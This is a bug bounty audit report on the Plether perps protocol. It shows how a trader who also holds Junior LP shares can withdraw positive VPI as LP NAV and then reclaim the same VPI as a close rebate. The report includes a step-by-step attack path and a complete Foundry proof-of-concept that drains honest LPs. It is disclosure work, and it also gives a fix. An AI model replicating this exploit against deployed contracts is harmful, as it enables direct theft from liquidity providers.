# \#98162 [SC-Critical] LP/trader can withdraw positive VPI as Junior NAV and reclaim it as a close rebate

**Submitted on Nov 5th 2026 at 16:54:58 UTC by @joesephdiver for [Audit Competition | Plether](https://immunefi.com/audit-competition/plether)**

- **Report ID:** #98162
- **Report Type:** Smart Contract
- **Report severity:** Critical
- **Target:** https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/HousePool.sol
- **Impacts:**
  - Direct theft of any user funds, whether at-rest or in-motion, other than unclaimed yield

## Description

## Brief / Introduction

A trader who also owns Junior LP shares can capture the same positive VPI value through two ownership paths. A skew-increasing open transfers positive VPI cash into `HousePool`, where it is immediately recorded as LP revenue and enters redemption NAV at the next reconciliation. The open position simultaneously retains the same positive `vpiAccrued` as live close-rebate capacity.

The attacker queues a Junior exit before trading, waits until the request is mature, opens near the skew limit, settles and claims the VPI-inflated LP exit, and reverse-closes at the same neutral mark. The attacker first withdraws its ownership share of the VPI cash as LP principal and then receives the position's corresponding lifetime-capped rebate. Remaining Junior LPs fund the difference.

The public bounded-V3 PoC uses the launch risk settings and produces:

```text
Positive VPI paid                 68,055.554043 USDG
LP assets claimed             50,056,256.465614 USDG
Attacker combined profit          28,713.024309 USDG
Other Junior value lost           42,713.248355 USDG
Protocol treasury gain            14,000.000000 USDG
Known depth-amplification part        51.422875 USDG
```

The neutral mark is unchanged across the round trip. Removing the already-disclosed live-depth amplification still leaves approximately 28,661.601434 USDG of attacker profit.

## Vulnerability Details

The open planner records the positive VPI as `posVpiAccruedDelta` (`packages/perps/src/libraries/CfdEnginePlanLib.sol:L384-L388`), and settlement writes it into the position's lifetime `vpiAccrued` (`packages/perps/src/CfdEngineSettlementSidecar.sol:L503-L520`).

At the same time, open settlement collects the trade cost and records the pool portion as immediately arrived claimant revenue (`packages/perps/src/CfdEngineSettlementSidecar.sol:L446-L463`). Thus the cash becomes physical HousePool assets while the position continues to carry the positive lifetime VPI balance.

HousePool has no corresponding contra-liability for refundable positive VPI:

- The canonical HousePool input snapshot contains physical assets, directional price liability, the settlement buffer, trader claims, and terminal price PnL, but no aggregate positive `vpiAccrued` reserve (`packages/perps/src/CfdEngineProtocolLens.sol:L49-L89`).
- The snapshot type itself has no VPI field (`packages/perps/src/interfaces/HousePoolEngineViewTypes.sol:L8-L36`), and terminal LP equity counts physical cash against only trader claims plus signed terminal price PnL (`packages/perps/src/libraries/HousePoolAccountingLib.sol:L57-L77`). The terminal book is explicitly price-PnL-only and its curve input omits VPI (`packages/perps/src/TerminalNavBookV2.sol:L53-L58`, `L115-L120`).
- The existing VPI reserve is one-sided: `_negativeVpiReserveTarget()` reserves only negative lifetime VPI and returns zero for a positive accrual (`packages/perps/src/libraries/CfdEnginePlanLib.sol:L47-L55`, `L343-L350`).
- The live withdrawal snapshot likewise reserves maximum directional liability, claims, and the settlement buffer, but not positive lifetime VPI (`packages/perps/src/HousePool.sol:L1230-L1254`).
- Reconciliation treats the resulting physical surplus as LP revenue (`packages/perps/src/HousePool.sol:L1555-L1598`, `packages/perps/src/libraries/HousePoolReconcilePlanLib.sol:L84-L99`) and routes revenue remaining after Senior restoration to Junior principal (`packages/perps/src/libraries/HousePoolWaterfallAccountingLib.sol:L133-L159`).
- LP settlement reconciles before pricing and funding matured redemptions (`packages/perps/src/HousePool.sol:L824-L891`).

The redemption request transfers shares into vault escrow but does not burn them (`packages/perps/src/TrancheVault.sol:L606-L630`); they remain in pricing supply until `fundRedeemEpoch()` burns the funded amount (`packages/perps/src/TrancheVault.sol:L1478-L1502`). The queued attacker therefore participates in the reconciliation that capitalizes the VPI cash.

The position nevertheless remains able to reclaim the VPI. On close, the protocol computes a negative VPI delta and clamps it only so lifetime VPI cannot become net negative (`packages/perps/src/libraries/CloseAccountingLib.sol:L103-L118`). A position holding `+V` can therefore receive a reverse delta approaching `-V`.

The close planner turns a negative net action amount into a pool-funded rebate (`packages/perps/src/libraries/CfdEnginePlanLib.sol:L1041-L1061`) and pays available rebate cash from HousePool (`packages/perps/src/libraries/CfdEnginePlanLib.sol:L970-L978`, `packages/perps/src/CfdEngineSettlementSidecar.sol:L621-L623`).

The violated invariant is:

> Value that remains live close-rebate capacity for an open position must not simultaneously be withdrawable LP principal.

## Preconditions and Attack Path

1. The attacker owns a material fraction of aged Junior shares and has enough trader collateral. The PoC uses 50M Junior assets plus 2M trader funding.
2. The pool contains 30M unimpaired Senior and 10M honest Junior capital, plus one-USDG permanent tranche seeds. Senior being at its recovery target lets new surplus flow to Junior. The active Senior limits are 40M absolute and 80% of protected capital.
3. The attacker requests redemption of all its Junior shares and waits for the request to mature before taking market exposure.
4. At a stable neutral mark, the attacker submits and executes a public bounded-V3 35M LONG, below the active 40% skew limit on the approximately 90M pool. The V3 commit and execution surfaces are public (`packages/perps/src/router/OrderLiquidationBatchLogic.sol:L127-L136`, `packages/perps/src/OrderRouter.sol:L233-L247`).
5. The open pays about 68,055.554043 USDG of positive VPI into HousePool while storing the same amount as positive lifetime `vpiAccrued`.
6. The attacker calls the permissionless atomic Router LP-settlement path with a current Pyth update (`packages/perps/src/OrderRouter.sol:L474-L484`). Reconciliation credits the VPI cash to Junior NAV and funds the pre-queued exit.
7. The attacker claims 50,056,256.465614 USDG from the Junior redemption.
8. The attacker reverse-closes the exact position through the public V3 path at the same neutral mark. The lifetime clamp permits an offsetting negative VPI, paid from the residual pool after fees and seconds of carry.

The same address performs the LP and trader actions. No privileged role, compromised keeper, Sybil identity, oracle manipulation, or inactive feature is required.

This is capital-intensive rather than flash or risk-free. The concrete attacker commits approximately 52M USDG and earns about 5.52 basis points per cycle before gas and execution risk. It waits through normal LP activation/cooldown/redemption timing and bears a few seconds of oracle, price, and carry risk. If the shares are already aged, the position itself is open only for the seconds surrounding LP settlement and the reverse close. A quiet redemption head, sufficient free cash, and Senior-covenant headroom are required.

The concrete PoC uses a valid zero-confidence Pyth observation. As a conservative analytical bound, the path remains profitable at the configured maximum confidence adjustment with a larger Junior share: at approximately 120M pool depth, 40M Senior, 10M honest Junior, 70M attacker Junior, and a 48M position, the maximum 10-bps confidence times the active 25% adverse multiplier leaves approximately 21.6k USDG after both execution fees and adverse-confidence price loss.

## Impact Details

This is direct theft of existing at-rest LP value, not merely unclaimed yield or a view discrepancy. The completed public-path round trip increases the attacker's combined LP-plus-trader wealth by 28,713.024309 USDG while an honest Junior holder's `convertToAssets` value falls by 42,713.248355 USDG at the same neutral mark. The protocol treasury receives 14,000 USDG, and the remaining 0.224046-USDG difference is seconds of carry and rounding. The PoC asserts this conservation relationship.

The attacker profit remains approximately 28,661.601434 USDG after removing the component attributable to the known live-depth effect. The theft therefore comes from recognizing reversible VPI as withdrawal NAV without a matching liability, not from obtaining an excessive close rebate.

The attack can be repeated after the normal LP lifecycle and scales with pool depth, although each cycle remains capital-intensive and exposed to execution timing.

## Known-Issue / Distinct-Root Analysis

The closest disclosed scan finding is “Temporary pool-liquidity reduction can amplify a skew-reducing close rebate.” It uses a similar withdraw-then-close sequence, but its root cause is different:

- The disclosed issue is `R(D_after) > R(D_before)`: withdrawing liquidity reduces the execution-time depth denominator and increases the close rebate.
- This report does not depend on an increased rebate. The missing state is a pool-side liability for positive `vpiAccrued`: the same value is both withdrawable LP NAV and retained close-rebate capacity.
- In the public V3 PoC, using the untouched post-open depth gives a 68,004.131168-USDG gross rebate instead of 68,055.554043 USDG. The known denominator effect is only 51.422875 USDG, while total attacker profit is 28,713.024309 USDG.

Snapshotting or stabilizing close depth fixes the disclosed scan issue but leaves this exploit profitable. This report requires reserving refundable positive lifetime VPI from LP NAV and withdrawal cash. Historical clamp tests examine trader-only wealth; they do not combine trader and LP ownership across the charge/refund boundary.

## Recommended Fix

Do not recognize positive VPI as final LP revenue while it remains live close-rebate capacity.

Track an aggregate pool-side reserve for positive lifetime VPI across open positions:

- Increase it when a position's positive `vpiAccrued` grows.
- Exclude it from HousePool reconciliation, share pricing, and withdrawal free cash.
- Consume or reduce it when the position receives a VPI rebate, partially closes, liquidates, or otherwise extinguishes the positive accrual.
- Recognize only the portion that can no longer be refunded as LP revenue.

Add a regression invariant that an actor's combined trader-account and LP wealth cannot increase in a zero-neutral-price-movement VPI round trip when LP ownership changes between charge and rebate.

## References

- Frozen commit: `a82d4fefb02768e5b3bddcc97dee371eee24fea8`
- Primary custody asset: `packages/perps/src/HousePool.sol`
- Open/close settlement: `packages/perps/src/CfdEngineSettlementSidecar.sol`
- VPI planning: `packages/perps/src/libraries/CfdEnginePlanLib.sol`
- Close clamp: `packages/perps/src/libraries/CloseAccountingLib.sol`


## Proof of Concept

## Proof of Concept

This PoC runs against the frozen repository without modifying any in-scope contract. It uses the production bounded-V3 order request, public order execution, public atomic LP settlement, the active 1% VPI factor and 40% skew limit, 10/20-bps maintenance/initial margin, 4-bps execution fee, 25-bps settlement buffer, 40M/80% Senior limits, and one-USDG permanent tranche seeds.

The same attacker address is both trader and Junior LP. Its redemption is mature before the position opens, so market exposure lasts only the few oracle seconds around LP settlement and the reverse close.

### Prerequisites and run command

Use the frozen repository with submodules initialized, the competition-pinned Foundry 1.5.1, and Solidity 0.8.35 available. Save the test below as `packages/perps/test/audit/VpiLpNavTimingPoC.t.sol`, then run from `packages/perps`:

```bash
forge test --offline \
  --match-path test/audit/VpiLpNavTimingPoC.t.sol \
  --match-test test_PoC_ExitCapitalizesRefundableVpiBeforeCloseRebate -vv
```

If Solidity 0.8.35 is not already installed, omit `--offline` for the first run so Forge can fetch it.

Expected Foundry 1.5.1 result:

```text
[PASS] test_PoC_ExitCapitalizesRefundableVpiBeforeCloseRebate()
1 passed; 0 failed
gas: 5,148,180

open VPI paid:                         68,055.554043
LP assets claimed:                50,056,256.465614
attacker combined profit:             28,713.024309
other Junior value lost:              42,713.248355
protocol treasury gain:               14,000.000000
known live-depth rebate amplification:    51.422875
```

### Test file

```solidity
// SPDX-License-Identifier: AGPL-3.0
pragma solidity 0.8.35;

import {BasePerpTest} from "../perps/BasePerpTest.sol";

import {CfdMath} from "@plether/perps/CfdMath.sol";
import {CfdTypes} from "@plether/perps/CfdTypes.sol";
import {OrderV3Types} from "@plether/perps/OrderV3Types.sol";

/// @notice Demonstrates that an LP/trader can withdraw open-time positive VPI as Junior NAV,
///         then receive the matching lifetime-capped close rebate from the residual LPs.
contract VpiLpNavTimingPoC is BasePerpTest {

    address private constant ATTACKER = address(0xA11CE);
    address private constant OTHER_JUNIOR = address(0xB0B);
    address private constant SENIOR_LP = address(0x5E1102);

    uint256 private constant ATTACKER_JUNIOR_ASSETS = 50_000_000e6;
    uint256 private constant OTHER_JUNIOR_ASSETS = 10_000_000e6;
    uint256 private constant SENIOR_ASSETS = 30_000_000e6;
    uint256 private constant POSITION_SIZE = 35_000_000e18;
    uint256 private constant POSITION_MARGIN = 500_000e6;
    uint256 private constant MARK_PRICE = 1e8;

    function _riskParams() internal pure override returns (CfdTypes.RiskParams memory params) {
        // Frozen-release launch configuration.
        params = CfdTypes.RiskParams({
            vpiFactor: 0.01e18,
            maxSkewRatio: 0.4e18,
            maintMarginBps: 10,
            initMarginBps: 20,
            fadMarginBps: 300,
            baseCarryBps: 500,
            minBountyAssets: 1e6,
            bountyBps: 10,
            keeperShareBps: 5000,
            protocolShareBps: 0
        });
    }

    function _initialJuniorDeposit() internal pure override returns (uint256) {
        return 0;
    }

    function _initialSeniorDeposit() internal pure override returns (uint256) {
        return 0;
    }

    function _initialJuniorSeedDeposit() internal pure override returns (uint256) {
        return 1e6;
    }

    function _initialSeniorSeedDeposit() internal pure override returns (uint256) {
        return 1e6;
    }

    function setUp() public override {
        super.setUp();

        // Launch Senior limits: $40m absolute and 80% of protected committed capital.
        _setSeniorCapacity(40_000_000e6, 8000);

        // Leave sufficient non-attacker Junior capital to satisfy the post-exit Senior covenant.
        _fundJunior(OTHER_JUNIOR, OTHER_JUNIOR_ASSETS);
        _fundSenior(SENIOR_LP, SENIOR_ASSETS);
        _fundJunior(ATTACKER, ATTACKER_JUNIOR_ASSETS);
        _fundTrader(ATTACKER, 2_000_000e6);

        assertEq(pool.maxSeniorExposureAssets(), 40_000_000e6, "launch Senior cap");
        assertEq(pool.maxSeniorShareBps(), 8000, "launch Senior ratio");
        assertEq(engine.executionFeeBps(), 4, "launch execution fee");
        assertEq(engine.settlementBufferBps(), 25, "launch settlement buffer");

        uint256 cooldownEnd = juniorVault.lastDepositTime(ATTACKER) + juniorVault.DEPOSIT_COOLDOWN();
        if (block.timestamp < cooldownEnd) {
            vm.warp(cooldownEnd);
        }
        assertFalse(engine.isOracleFrozen(), "PoC must execute in the ordinary live regime");
    }

    function _orderRequest(
        bytes32 clientOrderId,
        bool isClose
    ) private view returns (OrderV3Types.OrderRequest memory request) {
        request = OrderV3Types.OrderRequest({
            clientOrderId: clientOrderId,
            side: CfdTypes.Side.LONG,
            sizeDelta: POSITION_SIZE,
            marginDelta: isClose ? 0 : POSITION_MARGIN,
            targetPrice: isClose ? type(uint256).max : MARK_PRICE,
            isClose: isClose,
            bounds: OrderV3Types.ExecutionBounds({
                // Foundry cheatcode warps model separate transactions inside this one test call.
                submitBy: uint64(vm.getBlockTimestamp() + 120),
                executionWindowSeconds: 60,
                allowedExecutionModes: 7,
                expectedConfigHash: router.lifecycleBook().currentExecutionConfigHash(),
                maxExecutionBountyAssets: type(uint256).max,
                maxExecutionNotionalAssets: type(uint256).max,
                maxGrossAccountDebitAssets: type(uint256).max,
                maxActionChargeAssets: type(uint256).max,
                maxExplicitFeesAssets: type(uint256).max,
                maxPostPositionSize: type(uint256).max,
                minPostSettlementBalanceAssets: 0,
                minPostPositionEquityAssets: 0,
                maxPostLeverageBps: type(uint32).max
            })
        });
    }

    function test_PoC_ExitCapitalizesRefundableVpiBeforeCloseRebate() public {
        uint256 attackerShares = juniorVault.balanceOf(ATTACKER);
        uint256 otherJuniorShares = juniorVault.balanceOf(OTHER_JUNIOR);
        assertGt(attackerShares, 0);
        assertGt(otherJuniorShares, 0);

        // Queue the LP exit before paying VPI; epoch pricing occurs later, after the open.
        vm.prank(ATTACKER);
        uint256 redeemId = juniorVault.requestRedeem(attackerShares, ATTACKER, ATTACKER);

        // Wait until the request is mature before taking any market exposure. The open itself supplies a
        // post-boundary mark, so the position need only remain live for the few seconds needed to settle and close.
        uint256 settlementTime = pool.lpEpochStart(redeemId);
        if (block.timestamp < settlementTime) {
            vm.warp(settlementTime);
        }

        uint256 attackerLpValueBefore = juniorVault.convertToAssets(attackerShares);
        uint256 attackerWealthBefore =
            settlementToken.balanceOf(ATTACKER) + clearinghouse.balanceAssets(ATTACKER) + attackerLpValueBefore;
        uint256 otherJuniorValueBefore = juniorVault.convertToAssets(otherJuniorShares);
        uint256 treasuryBefore = clearinghouse.balanceAssets(engine.protocolTreasury());
        uint256 poolBeforeOpen = pool.totalAssets();

        OrderV3Types.OrderRequest memory openRequest = _orderRequest(keccak256("vpi-nav-open"), false);
        vm.prank(ATTACKER);
        uint64 openId = router.commitOrder(openRequest);
        bytes[] memory openUpdate = _mockPythUpdateData(MARK_PRICE);
        vm.prank(ATTACKER);
        router.executeOrder(openId, openUpdate);

        (uint256 openSize,,,,,, int256 accruedVpi) = engine.positions(ATTACKER);
        assertEq(openSize, POSITION_SIZE);
        assertGt(accruedVpi, 0, "skew-increasing open must pay positive VPI");
        uint256 paidVpiAssets = uint256(accruedVpi);
        assertEq(
            pool.totalAssets() - poolBeforeOpen,
            paidVpiAssets,
            "positive VPI, excluding the treasury execution fee, is immediately LP pool cash"
        );

        // Mature the queued exit, refresh the Engine mark in the settlement epoch, and price the exit
        // from principal that now includes the open-time VPI revenue.
        bytes[] memory settlementUpdate = _mockPythUpdateData(MARK_PRICE);
        vm.prank(ATTACKER);
        router.settleLpEpoch(settlementUpdate);

        uint256 claimableShares = juniorVault.claimableRedeemRequest(redeemId, ATTACKER);
        assertEq(claimableShares, attackerShares);
        vm.prank(ATTACKER);
        uint256 claimedLpAssets = juniorVault.claimRedeem(redeemId, claimableShares, ATTACKER, ATTACKER);
        assertGt(claimedLpAssets, attackerLpValueBefore, "settled LP exit must capitalize part of the open VPI");

        // Closing the exact position at the exact entry mark produces no price PnL. The reduced depth
        // makes raw negative VPI exceed the opening charge, so the lifetime clamp refunds that charge
        // (less close fee/carry) from the now-residual pool.
        OrderV3Types.OrderRequest memory closeRequest = _orderRequest(keccak256("vpi-nav-close"), true);
        vm.prank(ATTACKER);
        uint64 closeId = router.commitOrder(closeRequest);
        bytes[] memory closeUpdate = _mockPythUpdateData(MARK_PRICE);
        vm.prank(ATTACKER);
        router.executeOrder(closeId, closeUpdate);

        (uint256 finalSize,,,,,,) = engine.positions(ATTACKER);
        assertEq(finalSize, 0);
        assertEq(juniorVault.balanceOf(ATTACKER), 0);

        uint256 attackerWealthAfter =
            settlementToken.balanceOf(ATTACKER) + clearinghouse.balanceAssets(ATTACKER);
        uint256 otherJuniorValueAfter = juniorVault.convertToAssets(otherJuniorShares);
        uint256 attackerProfit = attackerWealthAfter - attackerWealthBefore;
        uint256 otherJuniorLoss = otherJuniorValueBefore - otherJuniorValueAfter;
        uint256 treasuryGain = clearinghouse.balanceAssets(engine.protocolTreasury()) - treasuryBefore;

        // The published scan already identifies rebate amplification from lowering live depth. Quantify that
        // component independently: even if the close used the untouched post-open depth, almost the entire
        // demonstrated profit remains. The distinct value transfer is the VPI-funded LP exit itself.
        uint256 notionalAssets = (POSITION_SIZE * MARK_PRICE) / CfdMath.ASSETS_TO_TOKEN_SCALE;
        int256 unmanipulatedCloseVpi = CfdMath.calculateVPI(
            notionalAssets, 0, poolBeforeOpen + paidVpiAssets, 0.01e18
        );
        uint256 unmanipulatedGrossRebate = uint256(-unmanipulatedCloseVpi);
        uint256 liveDepthAmplification = paidVpiAssets - unmanipulatedGrossRebate;

        emit log_named_uint("open VPI paid", paidVpiAssets);
        emit log_named_uint("LP assets claimed", claimedLpAssets);
        emit log_named_uint("attacker combined profit", attackerProfit);
        emit log_named_uint("other Junior value lost", otherJuniorLoss);
        emit log_named_uint("protocol treasury gain", treasuryGain);
        emit log_named_uint("known live-depth rebate amplification", liveDepthAmplification);

        assertGt(attackerProfit, 0, "VPI ownership timing must increase combined attacker wealth");
        assertGt(
            attackerProfit,
            liveDepthAmplification,
            "profit must persist after removing the scan-known live-depth amplification component"
        );
        assertLt(otherJuniorValueAfter, otherJuniorValueBefore, "residual Junior LP must bear the rebate loss");
        assertApproxEqAbs(
            otherJuniorLoss,
            attackerProfit + treasuryGain,
            1e6,
            "attacker profit plus protocol fee must explain the residual Junior loss"
        );
    }

}
```

### What the assertions prove

1. The launch 40M/80% Senior limits, 4-bps execution fee, and 25-bps settlement buffer are active.
2. The attacker uses production bounded-V3 commits/executions and the public Router LP-settlement path.
3. The LP exit is queued and matured before the position opens; no Sybil or privileged caller is used.
4. Positive VPI is simultaneously physical HousePool cash and positive lifetime `vpiAccrued` on the open position.
5. Reconciliation funds the complete attacker redemption from Junior principal after the VPI cash arrives.
6. A same-neutral-mark reverse close completes the round trip and leaves combined attacker wealth 28,713.024309 USDG higher.
7. The honest Junior holder loses 42,713.248355 USDG of share value; attacker profit plus the 14,000-USDG protocol fee explains that loss within sub-USDG carry/rounding tolerance.
8. Only 51.422875 USDG is attributable to the disclosed live-depth amplification. Profit remains approximately 28,661.601434 USDG using the untouched post-open depth.

The test uses a valid zero-confidence Pyth observation to isolate the accounting root. The report separately includes the active maximum-confidence economics. No RPC, fork, private key, Gist, `.audit` helper, or other audit test is required.

